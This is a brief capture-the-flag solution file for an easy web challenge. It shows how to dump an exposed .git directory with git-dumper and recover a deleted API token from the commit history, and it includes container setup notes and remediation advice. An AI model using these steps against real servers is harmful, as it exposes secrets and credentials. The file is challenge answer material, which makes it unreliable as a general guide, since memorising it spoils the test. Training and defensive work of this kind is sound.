# 05 — Git Happens (Pearl Telecom)

**Category:** Web / source disclosure · **Difficulty:** Easy · **Points:** 100 (dynamic)

## Intended solve
1. Notice `/.git/` is exposed at `http://<vm-ip>:8005/.git/`.
2. Dump it: `git-dumper http://<vm-ip>:8005/.git/ loot` (or fetch objects manually).
3. `cd loot && git log -p` — the removed `config.php` commit holds
   `define('API_TOKEN', 'CYPHER{...}')`.

## Infra
- `nginx:alpine` with `git`. At container start `docker-entrypoint.sh` builds a
  repo, commits the secret using `CHAL_FLAG`, then removes it in a later commit.
  The flag lives only in `.git` history — not in the working tree, image, or this repo.

## Remediation (Blue Team Brief)
Never deploy `.git` to production; deny `/.git` at the proxy; rotate any secret
that ever touched a repo; use deploy artifacts, not a working git tree.
